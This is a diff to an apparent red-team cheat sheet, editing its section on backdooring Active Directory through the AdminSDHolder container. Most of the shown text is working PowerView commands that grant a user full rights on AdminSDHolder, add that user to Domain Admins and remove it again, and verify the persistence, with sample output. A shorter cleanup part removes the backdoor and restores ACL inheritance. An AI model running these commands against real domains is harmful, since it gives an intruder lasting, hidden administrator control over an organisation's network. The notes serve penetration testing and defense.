@@ -926,17 +926,19 @@ $ secretsdump.py megacorp.local/snovvcrash@DC01.megacorp.local -dc-ip 10.10.13.3
 
 ### AdminSDHolder Modification
 
+* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
+* [https://attack.stealthbits.com/adminsdholder-modification-ad-persistence](https://attack.stealthbits.com/adminsdholder-modification-ad-persistence)
+
 
 #### Create a Backdoor
 
-Add a new domain user or grant AdminCount to an existent domain user:
+Add a new domain user or grant an existent user `GenericAll` permissions for the `AdminSDHolder` container:
 
 ```
-PS > net user snovvcrash Passw0rd! /domain /add
 PowerView3 > Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=megacorp,DC=local" -TargetDomain megacorp.local -PrincipalIdentity snovvcrash -PrincipalDomain megacorp.local -Rights All -Verbose
 ```
 
-Check that granting AdminCount was successfull (may take 60+ minutes):
+Check that granting `AdminSDHolder` permissions was successfull (may take 60+ minutes for the security ACLs to get updated for that user):
 
 ```
 PowerView3 > Get-DomainUser snovvcrash | select objectsid
@@ -959,17 +961,12 @@ AccessMask            : 983551
 AuditFlags            : None
 AceFlags              : None
 AceQualifier          : AccessAllowed
-
-PowerView3 > Get-DomainUser snovvcrash | select admincount,memberof
-
-admincount memberof
----------- --------
-         1 CN=Domain Admins,CN=Users,DC=megacorp,DC=local
 ```
 
-Now you can add "snovvcrash" user to Domain Admins any time and do any stuff you want (actually adding the user to Domain Admins not even necessary, as the AdminCount is `1` anyways):
+Now you can add yourself (the "snovvcrash" user) to the Domain Admins group any time and do stuff (actually adding the user to Domain Admins every time is not necessary, as the `AdminCount` attribute will stay `1` anyways after adding the backdoor user to a protected group for the first time):
 
 ```
+PowerView3 > Add-DomainGroupMember -Identity "Domain Admins" -Members snovvcrash
 PowerView3 > Get-DomainObjectAcl -Identity "Domain Admins" -Domain megacorp.local -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "S-1-5-21-2284550090-1208917427-1204316795-9824"}
 
 AceType               : AccessAllowed
@@ -988,28 +985,52 @@ AuditFlags            : None
 AceFlags              : None
 AceQualifier          : AccessAllowed
 
-PS > net group "Domain Admins" snovvcrash /domain /add
-...Do stuff...
+PowerView3 > Remove-DomainGroupMember -Identity "Domain Admins" -Members snovvcrash
+PowerView3 > Get-DomainUser snovvcrash | select admincount
 
-PS > net group "Domain Admins" snovvcrash /domain /del
+admincount
+----------
+         1
 ```
 
 
 #### Remove the Backdoor
 
-Disable or remove the account:
+* [https://www.reddefenseglobal.com/blog/microsoft-domain-attack-techniques/admincount/](https://www.reddefenseglobal.com/blog/microsoft-domain-attack-techniques/admincount/)
+* [https://www.ucunleashed.com/1621](https://www.ucunleashed.com/1621)
+
+Disable or remove the account (if a new user was created):
 
 ```
 PS > net user snovvcrash /domain /active:no
 PS > net user snovvcrash /domain /del
 ```
 
-Remove user AdminSDHolder container via GUI (ADUC).
+Remove user AdminSDHolder container via GUI (ADUC, dsa.msc).
 
-Clear the AdminCount (will be resetted if the user is still in AdminSDHolder container):
+Clear the `AdminCount` attribute (will be resetted if the user is still in the `AdminSDHolder` container):
 
 ```
-PowerView3 > Set-DomainObject -Identity testuser -Domain megacorp.local -Clear admincount -Verbose
+PowerView3 > Set-DomainObject -Identity snovvcrash -Domain megacorp.local -Clear admincount -Verbose
+Or
+PS > Get-ADUser snovvcrash | Set-ADObject -Clear adminCount
+```
+
+Fix the inheritance rules:
+
+```
+PS > [bool]$isProtected = $false
+PS > [bool]$PreserveInheritance = $true
+PS > [string]$dn = (Get-ADUser snovvcrash).DistinguishedName
+PS > $user = [ADSI]"LDAP://$dn"
+PS > $acl = $user.objectSecurity
+PS > $acl.AreAccessRulesProtected
+True  # procced if True
+PS > $acl.SetAccessRuleProtection($isProtected, $PreserveInheritance)
+PS > $inherited = $acl.AreAccessRulesProtected
+PS > $user.commitchanges()
+PS > $acl.AreAccessRulesProtected
+False
 ```
 
 
